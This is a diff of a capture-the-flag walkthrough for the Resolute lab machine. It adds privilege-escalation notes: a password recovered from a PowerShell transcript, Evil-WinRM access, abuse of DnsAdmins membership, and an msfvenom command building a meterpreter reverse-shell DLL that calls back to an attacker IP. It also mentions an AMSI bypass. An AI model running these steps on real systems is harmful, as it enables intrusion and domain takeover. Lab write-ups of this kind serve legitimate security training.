@@ -255,6 +255,12 @@ enum4linux -a -u "melanie" -p "Welcome123!" 10.129.60.74
 
 * Let's upload adPEAS and see what we can see
 
+## Privilege Escalation
+
+melanie -> ryan
+
+### Local enumeration
+
 ### Bypass AMSI
 
 ```
@@ -268,339 +274,67 @@ Import-Module .\adPEAS.ps1
 Invoke-ADPeas
 ```
 
-Output:
+* Unfortunately, there was nothing useful
+
+### WinPEAS Usage
+
+* I could also not find anything of use
+* I believe we need to conduct manual enumeration as there could be something lurking in the file system that we missed with automated enumeration tools
+
+### PowerShell Transcript
+
+* Had to conduct manual enumeration&#x20;
+* <mark style="color:yellow;">C:\PSTranscripts\20191203\PowerShell\_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</mark>
 
 {% code overflow="wrap" %}
 ```
-[*] +++++ Starting adPEAS Version 0.7.13 +++++
-adPEAS version 0.7.13
-[*] +++++ Starting Enumeration +++++
-[*] +++++ Searching for Domain Information +++++
-[*] +++++ Checking Domain +++++
-Checking Domain - Details for Domain 'megabank.local':
-
-
-Domain Name             : megabank.local
-Domain SID              : S-1-5-21-1392959593-3013219662-3596683436
-Domain Functional Level : Windows 2016
-Forest Name             : megabank.local
-Forest Children         : No Subdomain[s] available
-Domain Controller       : Resolute.megabank.local
-
-[*] +++++ Checking Password and Kerberos Policy +++++
-Checking Password Policy - Details for Domain 'megabank.local':
-Minimum Password Age    : 1 days
-Maximum Password Age    : Disabled
-Minimum Password Length : 7 character
-Password Complexity     : Disabled
-Lockout Account         : Disabled
-Reversible Encryption   : Disabled
-
-Checking Kerberos Policy - Details for Domain 'megabank.local':
-Maximum Age of TGT            : 10 hours
-Maximum Age of TGS            : 600 minutes
-Maximum Clock Time Difference : 5 minutes
-Krbtgt Password Last Set      : 9/25/2019 6:29:12 AM
-
-[*] +++++ Checking Domain Controller, Sites and Subnets +++++
-Checking Domain Controller - Details for Domain 'megabank.local':
-DC Host Name  : Resolute.megabank.local
-DC IP Address : ::1
-Site Name     : Default-First-Site-Name
-Domain        : megabank.local
-
-[*] +++++ Checking Forest and Domain Trusts +++++
-[*] +++++ Checking DCSync Rights +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync
-[*] +++++ Checking GenericAll Rights +++++
-[*] https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
-[*] +++++ Searching for Certificate Authority Information +++++
-[*] +++++ Searching for Enterprise CA +++++
-[*] https://posts.specterops.io/certified-pre-owned-d95910965cd2
-[*] +++++ Searching for Vulnerable Certificate Templates +++++
-[*] +++++ Searching for Credentials Exposure +++++
-[*] +++++ Searching for ASREPRoast Users +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast
-[*] +++++ Searching for Kerberoastable Users +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast#kerberoast
-[*] +++++ Searching for Users with a set 'Linux/Unix Password' attribute +++++
-[*] https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
-[*] +++++ Searching for Users with a set 'extensionData' attribute +++++
-[*] +++++ Searching for Computers with enabled and readable LAPS attribute +++++
-[*] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#antivirus-and-detectors
-[*] +++++ Searching for Group Managed Service Accounts (gMSA) +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
-[*] +++++ Searching for Crypted Passwords in SYSVOL Group Policy Objects +++++
-[*] https://www.andreafortuna.org/2019/02/13/abusing-group-policy-preference-files-for-password-discovery/
-[*] +++++ Searching for Sensitive Information in NETLOGON Share +++++
-[*] +++++ Searching for Delegation Issues +++++
-[*] +++++ Searching for Computers with Unconstrained Delegation Rights +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/unconstrained-delegation
-[*] +++++ Searching for Computers with Constrained Delegation Rights +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation
-[*] +++++ Searching for Computers with Resource-Based Constrained Delegation Rights +++++
-[*] https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
-[*] +++++ Searching for Users with Constrained Delegation Rights +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/constrained-delegation
-[*] +++++ Searching for Users with Resource-Based Constrained Delegation Rights +++++
-[*] https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
-[*] +++++ Starting Account Enumeration +++++
-[*] +++++ Starting Domain User Enumeration +++++
-[*] +++++ Searching for Searching for Azure AD Connect +++++
-[*] https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html
-[*] +++++ Searching for Users in High Privileged Groups +++++
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges
-Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Administrators':
-GroupName         : Enterprise Admins
-distinguishedName : CN=Enterprise Admins,CN=Users,DC=megabank,DC=local
-description       : Designated administrators of the enterprise
-objectSid         : S-1-5-21-1392959593-3013219662-3596683436-519
-MemberDomain      : megabank.local
-
-GroupName         : Domain Admins
-distinguishedName : CN=Domain Admins,CN=Users,DC=megabank,DC=local
-description       : Designated administrators of the domain
-objectSid         : S-1-5-21-1392959593-3013219662-3596683436-512
-MemberDomain      : megabank.local
-
-sAMAccountName     : Administrator
-userPrincipalName  :
-distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
-description        : Built-in account for administering the computer/domain
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
-MemberDomain       : megabank.local
-pwdLastSet         : 10/1/2022 10:48:53 AM
-lastLogonTimestamp : 9/30/2022 5:29:28 PM
-UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-
-Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Domain Admins':
-sAMAccountName     : Administrator
-userPrincipalName  :
-distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
-description        : Built-in account for administering the computer/domain
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
-MemberDomain       : megabank.local
-pwdLastSet         : 10/1/2022 10:48:53 AM
-lastLogonTimestamp : 9/30/2022 5:29:28 PM
-UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-
-Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Enterprise Admins':
-sAMAccountName     : Administrator
-userPrincipalName  :
-distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
-description        : Built-in account for administering the computer/domain
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
-MemberDomain       : megabank.local
-pwdLastSet         : 10/1/2022 10:48:53 AM
-lastLogonTimestamp : 9/30/2022 5:29:28 PM
-UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-
-Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Group Policy Creator Owners':
-sAMAccountName     : Administrator
-userPrincipalName  :
-distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
-description        : Built-in account for administering the computer/domain
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
-MemberDomain       : megabank.local
-pwdLastSet         : 10/1/2022 10:48:53 AM
-lastLogonTimestamp : 9/30/2022 5:29:28 PM
-UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-
-Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\DnsAdmins':
-GroupName         : Contractors
-distinguishedName : CN=Contractors,OU=Groups,DC=megabank,DC=local
-description       : {Contractors, $null}
-objectSid         : S-1-5-21-1392959593-3013219662-3596683436-1103
-MemberDomain      : megabank.local
-
-sAMAccountName     : ryan
-userPrincipalName  : ryan@megabank.local
-distinguishedName  : CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
-description        :
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-1105
-MemberDomain       : megabank.local
-pwdLastSet         : 10/1/2022 10:47:57 AM
-lastLogonTimestamp :
-UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-
-Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Account Operators':
-Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Server Operators':
-Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Print Operators':
-Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Backup Operators':
-Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Hyper-V Administrators':
-Searching for Users in High Privileged Groups - Members of Group 'BUILTIN\Access Control Assistance Operators':
-GroupName         : Contractors
-distinguishedName : CN=Contractors,OU=Groups,DC=megabank,DC=local
-description       : {Contractors, $null}
-objectSid         : S-1-5-21-1392959593-3013219662-3596683436-1103
-MemberDomain      : megabank.local
-
-sAMAccountName     : ryan
-userPrincipalName  : ryan@megabank.local
-distinguishedName  : CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
-description        :
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-1105
-MemberDomain       : megabank.local
-pwdLastSet         : 10/1/2022 10:47:57 AM
-lastLogonTimestamp :
-UserAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-
-sAMAccountName     : melanie
-userPrincipalName  : melanie@megabank.local
-distinguishedName  : CN=Melanie Purkis,CN=Users,DC=megabank,DC=local
-description        :
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-10101
-MemberDomain       : megabank.local
-pwdLastSet         : 10/1/2022 10:48:53 AM
-lastLogonTimestamp : 10/1/2022 9:57:06 AM
-UserAccountControl : NORMAL_ACCOUNT
-
-Searching for Users in High Privileged Groups - Members of Group 'MEGABANK\Cert Publishers':
-[*] +++++ Searching for High Privileged Users where the Password does not expire +++++
-[*] https://ldapwiki.com/wiki/DONT_EXPIRE_PASSWORD
-[!] The password of account 'Administrator' does not expire
-[+] The account 'Administrator' is or was member of a high privileged protected group
-[*] https://book.hacktricks.xyz/windows/active-directory-methodology/privileged-accounts-and-token-privileges#adminsdholder-group
-Searching for High Privileged Users where the Password does not expire - Details for User 'Administrator':
-sAMAccountName     : Administrator
-userPrincipalName  :
-distinguishedName  : CN=Administrator,CN=Users,DC=megabank,DC=local
-description        : Built-in account for administering the computer/domain
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-500
-userAccountControl : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-memberOf           : CN=Group Policy Creator Owners,CN=Users,DC=megabank,DC=local
-                     CN=Domain Admins,CN=Users,DC=megabank,DC=local
-                     CN=Enterprise Admins,CN=Users,DC=megabank,DC=local
-                     CN=Schema Admins,CN=Users,DC=megabank,DC=local
-                     CN=Administrators,CN=Builtin,DC=megabank,DC=local
-pwdLastSet         : 10/1/2022 10:48:53 AM
-lastLogonTimestamp : 9/30/2022 5:29:28 PM
-
-[*] +++++ Searching for High Privileged Users which may not require a Password +++++
-[*] https://ldapwiki.com/wiki/PASSWD_NOTREQD
-[*] +++++ Starting Computer Enumeration +++++
-[*] +++++ Searching Domain Controllers +++++
-Searching for Domain Controllers - Details for Computer 'RESOLUTE$':
-sAMAccountName     : RESOLUTE$
-dNSHostName        : Resolute.megabank.local
-distinguishedName  : CN=RESOLUTE,OU=Domain Controllers,DC=megabank,DC=local
-IPv4Address        : 10.129.60.74
-operatingSystem    : Windows Server 2016 Standard
-description        :
-objectSid          : S-1-5-21-1392959593-3013219662-3596683436-1000
-userAccountControl : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
-
-[*] +++++ Searching for Exchange Servers +++++
-[*] +++++ Searching for Enterprise CA Servers +++++
-[*] +++++ Starting BloodHound Enumeration +++++
-Result                 :
-Id                     : 1021
-Exception              : System.AggregateException: One or more errors occurred. ---> System.UnauthorizedAccessException: Access to the path 'C:\Windows\system32\20221001104939_containers.json' is denied.
-                            at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
-                            at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean
-                         bFromProxy, Boolean useLongPath, Boolean checkHost)
-                            at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
-                            at System.IO.StreamWriter.CreateFile(String path, Boolean append, Boolean checkHost)
-                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding, Int32 bufferSize, Boolean checkHost)
-                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding)
-                            at Sharphound.Writers.JsonDataWriter`1.CreateFile()
-                            at Sharphound.Writers.BaseWriter`1.<AcceptObject>d__6.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
-                            at Sharphound.Runtime.OutputWriter.<StartWriter>d__17.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
-                            at Sharphound.Runtime.CollectionTask.<StartCollection>d__10.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
-                            at Sharphound.SharpLinks.<AwaitBaseRunCompletion>d__6.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
-                            at Sharphound.Program.<>c__DisplayClass0_0.<<Main>b__1>d.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at CommandLine.ParserResultExtensions.<WithParsedAsync>d__20`1.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
-                            at Sharphound.Program.<Main>d__0.MoveNext()
-                            --- End of inner exception stack trace ---
-                         ---> (Inner Exception #0) System.UnauthorizedAccessException: Access to the path 'C:\Windows\system32\20221001104939_containers.json' is denied.
-                            at System.IO.__Error.WinIOError(Int32 errorCode, String maybeFullPath)
-                            at System.IO.FileStream.Init(String path, FileMode mode, FileAccess access, Int32 rights, Boolean useRights, FileShare share, Int32 bufferSize, FileOptions options, SECURITY_ATTRIBUTES secAttrs, String msgPath, Boolean
-                         bFromProxy, Boolean useLongPath, Boolean checkHost)
-                            at System.IO.FileStream..ctor(String path, FileMode mode, FileAccess access, FileShare share, Int32 bufferSize, FileOptions options, String msgPath, Boolean bFromProxy, Boolean useLongPath, Boolean checkHost)
-                            at System.IO.StreamWriter.CreateFile(String path, Boolean append, Boolean checkHost)
-                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding, Int32 bufferSize, Boolean checkHost)
-                            at System.IO.StreamWriter..ctor(String path, Boolean append, Encoding encoding)
-                            at Sharphound.Writers.JsonDataWriter`1.CreateFile()
-                            at Sharphound.Writers.BaseWriter`1.<AcceptObject>d__6.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
-                            at Sharphound.Runtime.OutputWriter.<StartWriter>d__17.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
-                            at Sharphound.Runtime.CollectionTask.<StartCollection>d__10.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter.GetResult()
-                            at Sharphound.SharpLinks.<AwaitBaseRunCompletion>d__6.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
-                            at Sharphound.Program.<>c__DisplayClass0_0.<<Main>b__1>d.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at CommandLine.ParserResultExtensions.<WithParsedAsync>d__20`1.MoveNext()
-                         --- End of stack trace from previous location where exception was thrown ---
-                            at System.Runtime.ExceptionServices.ExceptionDispatchInfo.Throw()
-                            at System.Runtime.CompilerServices.TaskAwaiter.HandleNonSuccessAndDebuggerNotification(Task task)
-                            at System.Runtime.CompilerServices.TaskAwaiter`1.GetResult()
-                            at Sharphound.Program.<Main>d__0.MoveNext()<---
-
-Status                 : Faulted
-IsCanceled             : False
-IsCompleted            : True
-CreationOptions        : None
-AsyncState             :
-IsFaulted              : True
-AsyncWaitHandle        : System.Threading.ManualResetEvent
-CompletedSynchronously : False
-
-2022-10-01T10:49:39.6647051-07:00|INFORMATION|Resolved Collection Methods: Group, GPOLocalGroup, Trusts, ACL, Container, ObjectProps
-2022-10-01T10:49:39.6801909-07:00|INFORMATION|Initializing SharpHound at 10:49 AM on 10/1/2022
-2022-10-01T10:49:50.9347395-07:00|INFORMATION|Flags: Group, GPOLocalGroup, Trusts, ACL, Container, ObjectProps
-2022-10-01T10:49:51.0753379-07:00|INFORMATION|Beginning LDAP search for megabank.local
-2022-10-01T10:49:51.1221987-07:00|INFORMATION|Producer has finished, closing LDAP channel
-2022-10-01T10:49:51.1221987-07:00|INFORMATION|LDAP channel closed, waiting for consumers
-2022-10-01T10:50:23.0108029-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 153 MB RAM
-2022-10-01T10:50:31.6174306-07:00|INFORMATION|Consumers finished, closing output channel
-2022-10-01T10:50:31.6486820-07:00|INFORMATION|Output channel closed, waiting for output task to complete
-
+>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
 ```
 {% endcode %}
 
-## Privilege Escalation
+* We see here in PS history that ryan is using his password to access a drive
 
-### Local enumeration
+<mark style="color:yellow;">ryan:Serv3r4Admin4cc123!</mark>
 
-### PrivEsc vector
+Access via Evil-WinRM:
+
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+* We see that ryan has a note on his Desktop:
+
+{% code overflow="wrap" %}
+```
+type note.txt
+Email to team:
+
+- due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute
+```
+{% endcode %}
+
+ryan -> admin
+
+Enumeration:
+
+{% code overflow="wrap" %}
+```
+whoami /groups
+
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+```
+{% endcode %}
+
+* I have not ever seen the <mark style="color:yellow;">DnsAdmins</mark> group before so I do some research on it
+
+{% embed url="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" %}
+
+### Exploiting DnsAdmin Privileges
+
+* The first thing we need to do is craft a malicious DLL which will grant us arbitrary code-execution in the context of SYSTEM
+
+msfvenom:
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=443 -f dll > evil.dll
+```
 
 ## Proofs
